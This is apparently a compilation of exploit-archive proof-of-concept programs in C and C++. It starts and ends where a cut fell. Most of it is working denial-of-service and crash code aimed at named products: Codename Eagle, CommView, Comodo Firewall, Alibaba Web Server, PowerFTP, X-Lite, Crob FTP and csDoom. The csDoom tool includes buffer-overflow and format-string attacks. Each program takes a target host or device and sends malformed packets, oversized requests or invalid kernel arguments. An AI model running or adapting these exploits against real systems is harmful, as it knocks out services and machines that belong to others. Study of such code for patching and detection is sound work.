        "Codename Eagle <= 1.42 socket unreacheable "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("- check server\n", stdout);
    SEND(INFO);
    RECV;

    if(*buff != 0x3d) {
        fputs("- server doesn't seem a valid Codename Eagle server, I continue\n", stdout);
    } else {
        printf("\n  Map:   %s\n\n", buff + 8);
    }

    fputs("- send BOOM packet\n", stdout);
    SEND(BOOM);

    sleep(ONESEC);

    fputs("- check if the server is vulnerable:\n", stdout);
    SEND(INFO);

    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);

    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}




#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2004-12-13]
/*-------------------------------------------------------------------------*/
/**
# Exploit Title : CommView Version 6.1 (Build 636) Local Denial Of Service (BSOD)   
# Corelan       : http://www.corelan.be:8800/advisories.php?id=CORELAN-10-030
# Date          : April 23rd, 2010
# Author        : p4r4N0ID (T.B)
# Bug found by  : p4r4N0ID (T.B)
# Software Link : http://www.tamos.com/download/main/
# Version       : Version 6.1 (Build 636)
# OS            : Windows
# Tested on     : Windows XP sp2 En (VMWARE)
# Type of vuln  : DoS
# Greetz to     : Corelan Security Team
# http://www.corelan.be:8800/index.php/security/corelan-team-members/
#
# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
# Corelan does not want anyone to use this script
# for malicious and/or illegal purposes.
# Corelan cannot be held responsible for any illegal use.
#
# Note : you are not allowed to edit/modify this code.  
# If you do, Corelan cannot be held responsible for any damages this may cause.
#
#
**/
/*--------------------------------------------------------------------------*/

#include <windows.h>
#include <stdio.h>


VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,"Error",0);
 exit(1);
}


int __cdecl main( int argc , char * argv[])
{
	HANDLE		hDevice;
	DWORD       junk;
	int i = 10;

	system("cls");	
	printf ("|------------------------------------------------------------------|");
	printf ("|                         __               __                      |");
	printf ("|   _________  ________  / /___ _____     / /____  ____ _____ ___  |");
	printf ("|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |");
	printf ("| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |");
	printf ("| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |");
	printf ("|                                                                  |");
	printf ("|                                       http://www.corelan.be:8800 |");
	printf ("|                                              security@corelan.be |");
	printf ("|                                                                  |");
	printf ("|-------------------------------------------------[ EIP Hunters ]--|");
	printf ("[+] CommView Local Denial Of Service (BSOD) - by p4r4N0ID(T.B)");


	//CHANGE the GUID so it match your device name
	//find it in:  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}
	
	hDevice = CreateFileA("\\\\.\\CV2K_{916BB164-6D0D-45C0-B6C2-79B42A522C17}",
						   0,
						   FILE_SHARE_READ | FILE_SHARE_WRITE,
						   NULL,
						   OPEN_EXISTING,
						   0,
						   NULL);


	if (hDevice == INVALID_HANDLE_VALUE)
	{
		   ShowError();
		   return EXIT_FAILURE;
	}


	printf("\n\n\t\t[!] Started Countdown");

	for(i;i>=1;i--)
	{
		printf("\r -[ %d ]- ",i);

		if(i==1) printf("\n[+] Bye Bye, BOOM!!!");
		Sleep(1000);
	} 

	DeviceIoControl(hDevice, 
					0x00002578, 
					(LPVOID) 0x80000001,
					0,
					(LPVOID) 0x80000002,
					0,
					&junk,  
					(LPOVERLAPPED)NULL);


	return EXIT_SUCCESS;


}source: http://www.securityfocus.com/bid/22357/info

Comodo Firewall is prone to multiple denial-of-service vulnerabilities because it fails to adequately validate user supplied data.

Exploiting these issues may permit attackers to cause system crashes and deny service to legitimate users. Presumaby, attackers may also be able to execute arbitrary code, but this has not been confirmed.

Comodo Firewall Pro 2.4.16.174 and Comodo Personal Firewall 2.3.6.81 are vulnerable; other versions may also be affected.

/*

 Testing program for Multiple insufficient argument validation of hooked 
SSDT function (BTP00000P005CF)
 

 Usage:
 prog FUNCNAME
   FUNCNAME - name of function to be checked

 Description:
 This program calls given function with parameters that crash the 
system. This happens because of 
 insufficient validation of function arguments in the driver of the 
firewall.

 Test:
 Running the testing program with the name of a function from the list 
of affected functions.

*/

#undef __STRICT_ANSI__
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <ddk/ntapi.h>
#include <ddk/ntifs.h>

void about(void)
{
  printf("Testing program for Multiple insufficient argument validation 
of hooked SSDT function (BTP00000P005CF)\n");
  printf("Windows Personal Firewall analysis project\n");
  printf("Copyright 2007 by Matousec - Transparent security\n");
  printf("http://www.matousec.com/""\n\n");
  return;
}

void usage(void)
{
  printf("Usage: test FUNCNAME\n"
         "  FUNCNAME - name of function to be checked\n");
  return;
}

void print_last_error(void)
{
  LPTSTR buf;
  DWORD code=GetLastError();
  if (FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | 
FORMAT_MESSAGE_FROM_SYSTEM,NULL,code,0,(LPTSTR)&buf,0,NULL))
  {
    fprintf(stderr,"Error code: %ld\n",code);
    fprintf(stderr,"Error message: %s",buf);
    LocalFree(buf);
  } else fprintf(stderr,"Unable to format error message for code 
%ld.\n",code);
  return;
}


int main(int argc,char **argv)
{
  about();

  if (argc!=2)
  {
    usage();
    return 1;
  }

  if (!stricmp(argv[1],"NtConnectPort") || 
!stricmp(argv[1],"ZwConnectPort"))
  {
    HANDLE handle;
    UNICODE_STRING us={0x1000,0x1000,NULL};
    SECURITY_QUALITY_OF_SERVICE sqos;
    for (int i=0;i>=0;i++)
    {
      us.Buffer=(PVOID)(i+0x80000000);
      ZwConnectPort(&handle,&us,&sqos,NULL,NULL,NULL,NULL,NULL);
    }
  } else if (!stricmp(argv[1],"NtCreatePort") || 
!stricmp(argv[1],"ZwCreatePort"))
  {
    HANDLE handle;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING us={0x1000,0x1000,NULL};
    InitializeObjectAttributes(&oa,&us,0,NULL,NULL);
    for (int i=0;i>=0;i++)
    {
      us.Buffer=(PVOID)(i+0x80000000);
      ZwCreatePort(&handle,&oa,0,0,0);
    }
  } else if (!stricmp(argv[1],"NtCreateSection") || 
!stricmp(argv[1],"ZwCreateSection"))
  {
    HANDLE handle;
    for (int i=0;i>=0;i++)
    {
      POBJECT_ATTRIBUTES oa=(PVOID)(i+0x80000000);
      ZwCreateSection(&handle,0,oa,NULL,0,0,NULL);
    }
  } else if (!stricmp(argv[1],"NtOpenProcess") || 
!stricmp(argv[1],"ZwOpenProcess"))
  {
    HANDLE handle;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING us={0x1000,0x1000,NULL};
    InitializeObjectAttributes(&oa,&us,0,NULL,NULL);
    for (int i=0;i>=0;i++)
    {
      PCLIENT_ID clid=(PVOID)(i+0x80000000);
      ZwOpenProcess(&handle,PROCESS_ALL_ACCESS,&oa,clid);
    }
  } else if (!stricmp(argv[1],"NtOpenSection") || 
!stricmp(argv[1],"ZwOpenSection"))
  {
    HANDLE handle;
    for (int i=0;i>=0;i++)
    {
      POBJECT_ATTRIBUTES oa=(PVOID)(i+0x80000000);
      ZwOpenSection(&handle,SECTION_ALL_ACCESS,oa);
    }
  } else if (!stricmp(argv[1],"NtOpenThread") || 
!stricmp(argv[1],"ZwOpenThread"))
  {
    HANDLE handle;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING us={0x1000,0x1000,NULL};
    InitializeObjectAttributes(&oa,&us,0,NULL,NULL);
    for (int i=0;i>=0;i++)
    {
      PCLIENT_ID clid=(PVOID)(i+0x80000000);
      ZwOpenThread(&handle,THREAD_ALL_ACCESS,&oa,clid);
    }
  } else if (!stricmp(argv[1],"NtSetValueKey") || 
!stricmp(argv[1],"ZwSetValueKey"))
  {
    for (int i=0;i>=0;i++)
    {
      PUNICODE_STRING us=(PVOID)(i+0x80000000);
      ZwSetValueKey(NULL,us,0,REG_NONE,NULL,0);
    }
  } else printf("\nI do not know how to exploit the vulnerability using 
this function.\n");

  printf("\nTEST FAILED!\n");
  return 1;
}

source: http://www.securityfocus.com/bid/1482/info

It is possible for a user to initiate a denial of service against Alibaba Web Server. Sending an unusually long GET request (> 8000 bytes) to the server will cause the service to stop responding. A restart of the server service is required in order to gain normal functionality.

/*

 Description: DoS against Alibaba 2.0 WebServer by wildcoyote
 Comments   : Based on advisorie by Prizm<Prizm@RESENTMENT.org>
 Platforms  : Alibaba runs on Win95/98/NT
 Flamez to  : wildcoyote@coders-pt.org

*/

#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

int 
openhost(char *host,int port) {
   int sock;
   struct sockaddr_in addr;
   struct hostent *he;
      
   he=gethostbyname(host);
   
   if (he==NULL) {
      perror("gethostbyname()");
      exit(-1); }
   
   sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
    
   if (sock==-1) {
      perror("socket()");
      exit(-1); }
    
   memcpy(&addr.sin_addr, he->h_addr, he->h_length);
   addr.sin_family=AF_INET;
   addr.sin_port=htons(port);

   if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
      sock=-2; } 
    
   return sock;
}

void 
sends(int sock,char *buf) {
  write(sock,buf,strlen(buf));
}

void 
DoS(char *host, int port)
{
 int sock,i;
 char *buf;
 printf("\nDoS against Alibaba 2.0 WebServer by wildcoyote\n\n");
 printf("Trying to connect to %s (%d)....(please wait)\n",host,port);
 sock=openhost(host,port);
 if(sock<=0) {
     printf("- Could not connect -\n");
     printf("Exiting...\n\n");
     exit(-1);
 }
 else printf("Connected to %s (%d)\n",host,port);
 printf("Allocating memory for DoS\n");
 buf = (char *) malloc(8200); // it takes 8173 bytes, but i wave mem ;)
 strcpy(buf,"GET ");
 for(i=5;i<8198;i++) strcat(buf,"A");
 strcat(buf,"\n\n");
 printf("Oh k! Sending CRASH!\n");
 sends(sock,buf);
 close(sock);
 free(buf);
 printf("Crash sent! The host *probably* crashed :P\n");
 printf("Send flamez to wildcoyote@coders-pt.org, *Enjoy*...\n\n");
}

main(int argc, char *argv[])
{
 int sock,i;
 if (argc<2) {
    printf("\nDoS against Alibaba 2.0 WebServer by wildcoyote\n\n");
    printf("Sintaxe: %s <host> [port - default 80]\n",argv[0]);
    printf("Send flamez to wildcoyote@coders-pt.org, *Enjoy*...\n\n");
 }
 else if (argc==2) DoS(argv[1],80);
      else DoS(argv[1],atoi(argv[2]));
}source: http://www.securityfocus.com/bid/5899/info

PowerFTP server is a shareware ftp server available for the Microsoft Windows platform. It is distributed and maintained by Cooolsoft.

It has been reported that PowerFTP server does not properly handle long user names. When excessive data is supplied as an argument to the FTP 'USER' command, the server becomes unstable. Exploitation of this vulnerability typically results in a crash of the server, requiring a manual restart to resume FTP service. 

/* Remote DoS Exploit for PowerFTP server (all version) */
/* Coding by Morgan A. member of secureNT-2000 Greetz : */
/* kdm, Yann, GaLiaRepT, and all i've forgotten ;)      */

#include <stdio.h>
#include <winsock.h>
        #pragma comment(lib, "wsock32.lib")

void main()
        {
        WSADATA WSAData;
                WSAStartup(MAKEWORD(2,0), &WSAData);

                SOCKET sock;
                SOCKADDR_IN sin;
                char *buffer = new char[255];

        char ip[50];
        printf ("Remote DoS Exploit for PowerFTP server\n\n");
        printf ("Remote IP: ");
        scanf ("%s", &ip);

        char DoS[3000];
        int i;
        for(i=0;i<strlen(DoS);i++)
        {
        DoS[i]= 'A';
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);

                sin.sin_addr.s_addr                     = inet_addr(ip);
                sin.sin_family                          = AF_INET;
                sin.sin_port                            = htons(21);

                connect(sock, (SOCKADDR *)&sin, sizeof(sin));
                send(sock, DoS, sizeof(DoS), 0);
                closesocket(sock);
                WSACleanup();
        }
/**********main.cpp***********/
#include <stdio.h>
#include <string>
using namespace std;

#ifdef WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define close closesocket
#define write(a,b,c) send(a, b, c, 0)
#define writeto(a,b,c,d,e) sendto(a, b, c, 0, d, e)
#define read(a,b,c) recv(a, b, c, 0)
#define readfrom(a,b,c,d,e) recvfrom(a, b, c, 0, d, e)
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <arpa/inet.h>
#define closesocket close
#define SOCKET int
#define DWORD unsigned long
#endif

char *craft_pkt[] =
{
       "MESSAGE sip:[FROMUSER]@[DOMAIN] SIP/2.0\r\n"
       "Via: SIP/2.0/UDP [FROMADDR]:[LOCALPORT];branch=[BRANCH]\r\n"
       "From: [FROMUSER] <sip:[FROMADDR]:[LOCALPORT]>;tag=[TAG]\r\n"
       "To: <sip:[TOADDR]>\r\n"
       "Call-ID: [CALLID]@[DOMAIN]\r\n"
       "CSeq: [CSEQ] MESSAGE\r\n"
       "Contact: <sip:[FROMUSER]@[DOMAIN]:[LOCALPORT]>\r\n"
       "Content-Length: 0\r\n\r\n",

       "INVITE sip:[FROMUSER]@[DOMAIN] SIP/2.0\r\n"
       "Via: SIP/2.0/UDP [FROMADDR]:[LOCALPORT];branch=[BRANCH]\r\n"
       "To: <sip:[TOADDR]>\r\n"
       "From: [FROMUSER] <sip:[FROMADDR]:[LOCALPORT]>;tag=[TAG]\r\n"
       "Call-ID: [CALLID]@[DOMAIN]\r\n"
       "CSeq: [CSEQ] INVITE\r\n"
       "Contact: <sip:[FROMUSER]@[DOMAIN]:[LOCALPORT]>\r\n"
       "Content-Length: 0\r\n\r\n",
};

void socket_init()
{
#ifdef WIN32
       WSADATA wsaData;
       WSAStartup(MAKEWORD(2,0), &wsaData);
#endif
}

unsigned long resolv(const char *host)
{
       struct hostent             *hp;
       unsigned long              host_ip;

       host_ip = inet_addr(host);
       if( host_ip == INADDR_NONE )
       {
               hp = gethostbyname(host);
               if(!hp)
               {
                       printf("\nError: Unable to resolve hostname (%s)\n",host);
                       exit(1);
               }
               else
                       host_ip = *(u_long*)hp->h_addr ;
       }

       return(host_ip);
}

SOCKET udpsocket()
{
       /* network */
       SOCKET sockfd;
       struct sockaddr_in laddr, raddr;

       sockfd = socket(AF_INET, SOCK_DGRAM, 0);
       if (sockfd == -1)
               goto error;

       memset((char *) &laddr, 0, sizeof(laddr));
       laddr.sin_family = AF_INET;
       laddr.sin_addr.s_addr = htonl(INADDR_ANY);
       if (bind(sockfd, (struct sockaddr *) &laddr, sizeof(laddr)) == -1)
               goto error;

       return sockfd;

error:
#ifdef WIN32
       printf("Error:%d\n", GetLastError());
#endif
       return 0;
}


string &replace_all(string &str,const string& old_value,const string& new_value)
{
       while(true)
       {
               string::size_type   pos(0);
               if(   (pos=str.find(old_value))!=string::npos)
                       str.replace(pos,old_value.length(),new_value);
               else   break;
       }
       return   str;
}

string &replace_with_rand(string &str, char *value, int len)
{
       char *strspace = "0123456789";
       char randstr[100];
       for(int i=0; i<len; i++)
       {
               do
               {
                       randstr[i] = strspace[rand()%strlen(strspace)];
               }while(randstr[i] == '0');
       }
       randstr[len] = 0;
       replace_all(str, value, randstr);
       return str;
}

string build_packet(string _packet, char *addr, char *host)
{
       string packet = _packet;
       replace_all(packet, "[FROMADDR]", addr);
       replace_all(packet, "[TOADDR]", host);
       replace_all(packet, "[DOMAIN]", "www.nosec.org");
       replace_all(packet, "[FROMUSER]", "siprint");
       replace_with_rand(packet, "[CSEQ]", 9);
       replace_with_rand(packet, "[CALLID]", 9);
       replace_with_rand(packet, "[TAG]", 9);
       replace_with_rand(packet, "[BRANCH]", 9);
       return packet;
}

int main(int argc, char **argv)
{
       char *host;
       int port;
       char *localip;
       struct sockaddr_in sockaddr;
       struct sockaddr_in raddr;
       int sockaddrlen = sizeof(sockaddr);
       SOCKET s;

       printf("X-Lite Missing Content-Type DOS PoC\n");

       if(argc != 4)
       {
               printf("usage : %s <host> <port> <localip>\n", argv[0]);
               exit(-1);
       }

       host = argv[1];
       port = atoi(argv[2]);
       localip = argv[3];

       socket_init();
       s = udpsocket();
       if(s == 0)
       {
               printf("Create udp socket error!\n", host, port);
               return 1;
       }
       memset(&sockaddr, 0, sockaddrlen);
       getsockname(s, (struct sockaddr *) &sockaddr, (int *) &sockaddrlen);

       raddr.sin_family = AF_INET;
       raddr.sin_addr.S_un.S_addr = resolv(host);
       raddr.sin_port = htons(port);
       for(int i=0; i<20; i++)
       {
               char portstr[6] = {'\0'};
               string packet = build_packet(craft_pkt[i%2], localip, host);
               sprintf(portstr, "%d", ntohs(sockaddr.sin_port));
               replace_all(packet, "[LOCALPORT]", portstr);
               //printf("===========\n%s\n===========\n", packet.c_str());
               writeto(s, packet.c_str(), packet.length(), (struct sockaddr*)&raddr, sockaddrlen);
               Sleep(100);
       }

       return 0;
}

// milw0rm.com [2007-08-13]
source: http://www.securityfocus.com/bid/9651/info

It has been reported that the Crob FTP server is prone to a remote denial of service vulnerability. An attacker may exploit this issue to cause the affected server to crash, denying service to legitimate users.

/******************************/
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[])
{

  int s;
  struct sockaddr_in target;

  if(argc < 2)
    {
      printf("Usage: %s HOST [PORT]\n\n",argv[0]);
      return 0;
    }

        do
	  {
	    s = socket(AF_INET, SOCK_STREAM, 0);
	    target.sin_family = AF_INET;
	    target.sin_port = htons(atoi(argv[2]));
	    target.sin_addr.s_addr = inet_addr(argv[1]);

	    printf("-       connecting...\n");

	    if( connect(s,(struct sockaddr*)&target, sizeof(struct sockaddr))<0)
	      {
                printf("        connect() error!\n\n");
                exit(-1);
	      }

	    printf("        connected\n");
	    printf("        closing connection\n");
	    close(s);
	  }
        while(1);
        return 0;
}
/*******************************//*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <sys/param.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER                 "0.1"
#define PORT                10666
#define BUFFSZ              8192
#define BOFSZ1              2048
#define BOFSZ2              2048
#define FORMATSTRING        "%n%n%n%n%n%n%n"

#define PUT16(x,y)          *(u_short *)x = y; \
                            x += 2;
#define PUT32(x,y)          *(u_int *)x = y; \
                            x += 4;

#define CHALLENGE           5560020     // challenge
#define LAUNCHER_CHALLENGE  777123      // csdl challenge
#define VERSION             70
#define S2C_CHALLENGE       10
#define S2C_CONNECTION      11
#define S2C_FULL            12

#define clc_disconnect      3
#define clc_say             4
#define clc_move            5
#define clc_userinfo        6
#define clc_svgametic       7
#define clc_rate            8
#define clc_ack             9
#define clc_rcon            10
#define clc_rcon_password   11
#define clc_changeteam      12



int info_proto(u_char *data, int len);
int create_bof_string(u_char *data, int len);
int create_rand_string(u_char *data, int len, u_int *seed);
int mycpy(u_char *dst, u_char *src);
int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
int timeout(int sock, int sec);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    u_int   seed;
    int     sd,
            i,
            len,
            chall = CHALLENGE,
            attack;
    u_short port = PORT;
    u_char  buff[BUFFSZ],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "csDoom <= 0.7 multiple vulnerabilities " VER "\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attack:\n"
            " 1 = buffer-overflow in SV_BroadcastPrintf\n"
            " 2 = buffer-overflow in SV_SetupUserInfo\n"
            " 3 = format string in Printf\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port    = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    seed = time(NULL);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("- query server:\n");

    p = buff;
    PUT32(p, LAUNCHER_CHALLENGE);
    len = send_recv(sd, buff, p - buff, buff, sizeof(buff), 1);
    chall = info_proto(buff, len);

    printf("- start connection:\n");

    p = buff;
    PUT32(p, chall);
    len = send_recv(sd, buff, p - buff, buff, sizeof(buff), 1);

    if(buff[0] != S2C_CHALLENGE) {
        close(sd);
        if(buff[0] == S2C_FULL) {
            printf("\nError: server is full\n\n");
        } else {
            printf("\nError: client has not been accepted (%hhu)\n\n", buff[0]);
        }
        exit(1);
    }

    p = buff;
    PUT16(p, VERSION);
    len = send_recv(sd, buff, p - buff, buff, sizeof(buff), 1);

    if(buff[0] != S2C_CONNECTION) {
        close(sd);
        printf("\nError: your client has been disconnected (wrong version?) (%hhu)\n\n", buff[0]);
        exit(1);
    }

    p = buff;
    *p++ = clc_userinfo;
    if(attack == 2) {                       // nickname
        printf("- send big nickname\n");
        p += create_bof_string(p, BOFSZ1);

    } else if(attack == 3) {
        printf("- send formatted nickname\n");
        p += mycpy(p, FORMATSTRING);

    } else {
        printf("- send nickname\n");
        p += create_rand_string(p, 16, &seed);
    }
    p += create_rand_string(p, 16, &seed);  // teamname
    PUT32(p, seed);                         // rate value

    if((attack == 2) || (attack == 3)) {
        len = send_recv(sd, buff, p - buff, buff, sizeof(buff), 0);
        goto quit;
    }

    len = send_recv(sd, buff, p - buff, buff, sizeof(buff), 1);

    if(attack == 1) {
        printf("- send big say message\n");
        p = buff;
        *p++ = clc_say;
        p += create_bof_string(p, BOFSZ2);

        len = send_recv(sd, buff, p - buff, buff, sizeof(buff), 0);
    }

//    printf("- disconnect\n");
//    p = buff;
//    *p++ = clc_disconnect;
//
//    len = send_recv(sd, buff, p - buff, buff, sizeof(buff), 0);

quit:
    close(sd);

    printf("- wait some seconds\n");
    for(i = 3; i; i--) {
        printf("%d\r", i);
        sleep(ONESEC);
    }

    printf("- check server:\n");

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    p = buff;
    PUT32(p, LAUNCHER_CHALLENGE);
    if(send_recv(sd, buff, p - buff, buff, sizeof(buff), 0) < 0) {
        printf("\n  Server IS vulnerable!!!\n\n");
    } else {
        printf("\n  Server does not seem vulnerable\n\n");
    }

    close(sd);
    return(0);
}



int info_proto(u_char *data, int len) {
    int     ver,
            num;
    u_char  *limit;

    limit = data + len;
    ver = *(u_int *)data;                                   data += 4;
    printf("  Version    %d\n", ver);
    printf("  Hostname   %s\n", data);                      data += strlen(data) + 1;
    printf("  Players    %hhu/%hhu\n", data[0], data[1]);   data += 2;
    printf("  Mapname    %s\n", data);                      data += strlen(data) + 1;
    if(*data++) {
        printf("  Wad        %s\n", data);                  data += strlen(data) + 1;
    }
    printf("  Deathmatch %hhu\n", *data++);
    printf("  Gameskill  %hhu\n", *data++);
    printf("  Teamplay   %hhu\n", *data++);
    printf("  Fragstats  %s\n", data);                      data += strlen(data) + 1;
    printf("  DMFlags    %u\n", *(u_int *)data);            data += 4;
    num = *data++;
    if(num) {
        printf("  Players:\n");
        while(num--) {
            printf("    %s ", data);                        data += strlen(data) + 1;
            printf("  %hu ", *(u_short *)data);             data += 2;
            printf("  %hu\n", *(u_short *)data);            data += 2;
        }
    }

    return(ver);
}



int create_bof_string(u_char *data, int len) {
    memset(data, 'a', len);
    data[len] = 0;
    return(len + 1);
}



int create_rand_string(u_char *data, int len, u_int *seed) {
    u_int   rnd;
    u_char  *p;
    const static u_char table[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";

    rnd = *seed;
    p   = data;

    len = rnd % len;
    if(len < 6) len = 6;

    while(--len) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        rnd >>= 3;
        *p++ = table[rnd % (sizeof(table) - 1)];
    }
    *p++ = 0;

    *seed = rnd;
    return(p - data);
}



int mycpy(u_char *dst, u_char *src) {
    u_char  *p;

    for(p = dst; *src; src++, p++) {
        *p = *src;
    }
    *p++ = 0;
    return(p - dst);
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
    int     retry,
            len;

    if(in) {
        for(retry = 3; retry; retry--) {
            if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
            if(!timeout(sd, 2)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            fputs("\nError: socket timeout, no reply received\n\n", stdout);
            exit(1);
        }
    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) std_err();
    return(len);
}



int timeout(int sock, int sec) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = sec;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
